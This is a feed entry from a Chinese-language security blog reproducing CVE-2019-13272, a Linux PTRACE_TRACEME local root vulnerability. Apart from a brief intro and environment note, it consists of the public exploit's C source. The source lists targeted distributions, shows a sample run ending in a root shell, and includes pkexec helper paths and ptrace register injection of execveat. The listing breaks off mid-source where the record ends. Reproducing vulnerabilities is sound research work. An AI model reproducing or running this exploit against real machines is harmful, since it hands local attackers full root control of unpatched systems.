    <link href="https:///login546.github.io/2019/07/30/CVE-2019-13272%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https:///login546.github.io/2019/07/30/CVE-2019-13272漏洞复现/</id>
    <published>2019-07-30T09:54:52.000Z</published>
    <updated>2021-01-22T08:48:08.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-13272漏洞复现"><a href="#CVE-2019-13272漏洞复现" class="headerlink" title="CVE-2019-13272漏洞复现"></a>CVE-2019-13272漏洞复现</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>2019年7月29日，网上出现的CVE-2019-13272（Linux本地提权漏洞）的利用脚本，于是拿来复现了一下。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>Ubuntu 16.04.5 kernel 4.15.0-29-generic(本次复现利用版本)</li><li><a href="http://releases.ubuntu.com/16.04.5/ubuntu-16.04.5-desktop-amd64.iso" target="_blank" rel="noopener">下载链接</a></li></ul><p><img src="https://user-images.githubusercontent.com/38073810/62094923-50704000-b2b1-11e9-9086-0f4b72c10dc3.png" alt="image"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)</span></span><br><span class="line"><span class="comment">// Uses pkexec technique</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// Original discovery and exploit author: Jann Horn</span></span><br><span class="line"><span class="comment">// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// &lt;bcoles@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// - added known helper paths</span></span><br><span class="line"><span class="comment">// - added search for suitable helpers</span></span><br><span class="line"><span class="comment">// - added automatic targeting</span></span><br><span class="line"><span class="comment">// - changed target suid exectuable from passwd to pkexec</span></span><br><span class="line"><span class="comment">// https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// - Ubuntu 16.04.5 kernel 4.15.0-29-generic</span></span><br><span class="line"><span class="comment">// - Ubuntu 18.04.1 kernel 4.15.0-20-generic</span></span><br><span class="line"><span class="comment">// - Ubuntu 19.04 kernel 5.0.0-15-generic</span></span><br><span class="line"><span class="comment">// - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</span></span><br><span class="line"><span class="comment">// - Linux Mint 19 kernel 4.15.0-20-generic</span></span><br><span class="line"><span class="comment">// - Xubuntu 16.04.4 kernel 4.13.0-36-generic</span></span><br><span class="line"><span class="comment">// - ElementaryOS 0.4.1 4.8.0-52-generic</span></span><br><span class="line"><span class="comment">// - Backbox 6 kernel 4.18.0-21-generic</span></span><br><span class="line"><span class="comment">// - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64</span></span><br><span class="line"><span class="comment">// - Kali kernel 4.19.0-kali5-amd64</span></span><br><span class="line"><span class="comment">// - Redcore 1806 (LXQT) kernel 4.16.16-redcore</span></span><br><span class="line"><span class="comment">// - MX 18.3 kernel 4.19.37-2~mx17+1</span></span><br><span class="line"><span class="comment">// - RHEL 8.0 kernel 4.18.0-80.el8.x86_64</span></span><br><span class="line"><span class="comment">// - Debian 9.4.0 kernel 4.9.0-6-amd64</span></span><br><span class="line"><span class="comment">// - Debian 10.0.0 kernel 4.19.0-5-amd64</span></span><br><span class="line"><span class="comment">// - Devuan 2.0.0 kernel 4.9.0-6-amd64</span></span><br><span class="line"><span class="comment">// - SparkyLinux 5.8 kernel 4.19.0-5-amd64</span></span><br><span class="line"><span class="comment">// - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</span></span><br><span class="line"><span class="comment">// - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</span></span><br><span class="line"><span class="comment">// - Mageia 6 kernel 4.9.35-desktop-1.mga6</span></span><br><span class="line"><span class="comment">// - Antergos 18.7 kernel 4.17.6-1-ARCH</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root</span></span><br><span class="line"><span class="comment">// user@linux-mint-19-2:~$ ./ptrace_traceme_root</span></span><br><span class="line"><span class="comment">// Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)</span></span><br><span class="line"><span class="comment">// [.] Checking environment ...</span></span><br><span class="line"><span class="comment">// [~] Done, looks good</span></span><br><span class="line"><span class="comment">// [.] Searching for known helpers ...</span></span><br><span class="line"><span class="comment">// [~] Found known helper: /usr/sbin/mate-power-backlight-helper</span></span><br><span class="line"><span class="comment">// [.] Using helper: /usr/sbin/mate-power-backlight-helper</span></span><br><span class="line"><span class="comment">// [.] Spawning suid process (/usr/bin/pkexec) ...</span></span><br><span class="line"><span class="comment">// [.] Tracing midpid ...</span></span><br><span class="line"><span class="comment">// [~] Attached to midpid</span></span><br><span class="line"><span class="comment">// To run a command as administrator (user "root"), use "sudo &lt;command&gt;".</span></span><br><span class="line"><span class="comment">// See "man sudo_root" for details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// root@linux-mint-19-2:/home/user#</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> dprintf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> dprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAFE(expr) (&#123;                   \</span></span><br><span class="line">  typeof(expr) __res = (expr);          \</span><br><span class="line">  <span class="keyword">if</span> (__res == <span class="number">-1</span>) &#123;                    \</span><br><span class="line">    dprintf(<span class="string">"[-] Error: %s\n"</span>, #expr);  \</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                           \</span><br><span class="line">  &#125;                                     \</span><br><span class="line">  __res;                                \</span><br><span class="line">&#125;)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b) ? (a) : (b))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *SHELL = <span class="string">"/bin/bash"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> middle_success = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> block_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> self_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> dummy_status;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *helper_path;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pkexec_path = <span class="string">"/usr/bin/pkexec"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *pkaction_path = <span class="string">"/usr/bin/pkaction"</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *helpers[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *known_helpers[] = &#123;</span><br><span class="line">  <span class="string">"/usr/lib/gnome-settings-daemon/gsd-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/unity-settings-daemon/usd-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/sbin/mate-power-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/bin/xfpm-power-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/bin/lxqt-backlight_backend"</span>,</span><br><span class="line">  <span class="string">"/usr/libexec/gsd-wacom-led-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/libexec/gsd-wacom-oled-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/libexec/gsd-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/gsd-backlight-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/gsd-wacom-led-helper"</span>,</span><br><span class="line">  <span class="string">"/usr/lib/gsd-wacom-oled-helper"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* temporary printf; returned pointer is valid until next tprintf */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">tprintf</span><span class="params">(<span class="keyword">char</span> *fmt, ...)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">10000</span>];</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start(ap, fmt);</span><br><span class="line">  <span class="built_in">vsprintf</span>(buf, fmt, ap);</span><br><span class="line">  va_end(ap);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fork, execute pkexec in parent, force parent to trace our child process,</span></span><br><span class="line"><span class="comment"> * execute suid executable (pkexec) in child.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_main</span><span class="params">(<span class="keyword">void</span> *dummy)</span> </span>&#123;</span><br><span class="line">  prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">  <span class="keyword">pid_t</span> middle = getpid();</span><br><span class="line"></span><br><span class="line">  self_fd = SAFE(open(<span class="string">"/proc/self/exe"</span>, O_RDONLY));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pid_t</span> child = SAFE(fork());</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line"></span><br><span class="line">    SAFE(dup2(self_fd, <span class="number">42</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spin until our parent becomes privileged (have to be fast here) */</span></span><br><span class="line">    <span class="keyword">int</span> proc_fd = SAFE(open(tprintf(<span class="string">"/proc/%d/status"</span>, middle), O_RDONLY));</span><br><span class="line">    <span class="keyword">char</span> *needle = tprintf(<span class="string">"\nUid:\t%d\t0\t"</span>, getuid());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">1000</span>];</span><br><span class="line">      <span class="keyword">ssize_t</span> buflen = SAFE(pread(proc_fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>));</span><br><span class="line">      buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, needle)) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is where the bug is triggered.</span></span><br><span class="line"><span class="comment">     * while our parent is in the middle of pkexec, we force it to become our</span></span><br><span class="line"><span class="comment">     * tracer, with pkexec's creds as ptracer_cred.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    SAFE(ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now we execute a suid executable (pkexec).</span></span><br><span class="line"><span class="comment">     * Because the ptrace relationship is considered to be privileged,</span></span><br><span class="line"><span class="comment">     * this is a proper suid execution despite the attached tracer,</span></span><br><span class="line"><span class="comment">     * not a degraded one.</span></span><br><span class="line"><span class="comment">     * at the end of execve(), this process receives a SIGTRAP from ptrace.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    execl(pkexec_path, basename(pkexec_path), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    dprintf(<span class="string">"[-] execl: Executing suid executable failed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SAFE(dup2(self_fd, <span class="number">0</span>));</span><br><span class="line">  SAFE(dup2(block_pipe[<span class="number">1</span>], <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* execute pkexec as current user */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> = <span class="title">getpwuid</span>(<span class="title">getuid</span>());</span></span><br><span class="line">  <span class="keyword">if</span> (pw == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    dprintf(<span class="string">"[-] getpwuid: Failed to retrieve username"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  middle_success = <span class="number">1</span>;</span><br><span class="line">  execl(pkexec_path, basename(pkexec_path), <span class="string">"--user"</span>, pw-&gt;pw_name,</span><br><span class="line">        helper_path,</span><br><span class="line">        <span class="string">"--help"</span>, <span class="literal">NULL</span>);</span><br><span class="line">  middle_success = <span class="number">0</span>;</span><br><span class="line">  dprintf(<span class="string">"[-] execl: Executing pkexec failed"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ptrace pid and wait for signal */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">force_exec_and_wait</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> exec_fd, <span class="keyword">char</span> *arg0)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span> .iov_base = &amp;regs, .iov_len = <span class="keyword">sizeof</span>(regs) &#125;;</span><br><span class="line">  SAFE(ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">  SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* set up indirect arguments */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> scratch_area = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">injected_page</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> envv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span> arg0[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">1</span>];</span><br><span class="line">  &#125; ipage = &#123;</span><br><span class="line">    .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">strcpy</span>(ipage.arg0, arg0);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(ipage)/<span class="keyword">sizeof</span>(<span class="keyword">long</span>); i++) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pdata = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ipage)[i];</span><br><span class="line">    SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">                (<span class="keyword">void</span>*)pdata));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* execveat(exec_fd, path, argv, envv, flags) */</span></span><br><span class="line">  regs.orig_rax = __NR_execveat;</span><br><span class="line">  regs.rdi = exec_fd;</span><br><span class="line">  regs.rsi = scratch_area + offsetof(struct injected_page, path);</span><br><span class="line">  regs.rdx = scratch_area + offsetof(struct injected_page, argv);</span><br><span class="line">  regs.r10 = scratch_area + offsetof(struct injected_page, envv);</span><br><span class="line">  regs.r8 = AT_EMPTY_PATH;</span><br><span class="line"></span><br><span class="line">  SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line">  SAFE(ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line">  SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_stage2</span><span class="params">(<span class="keyword">void</span>)</span> 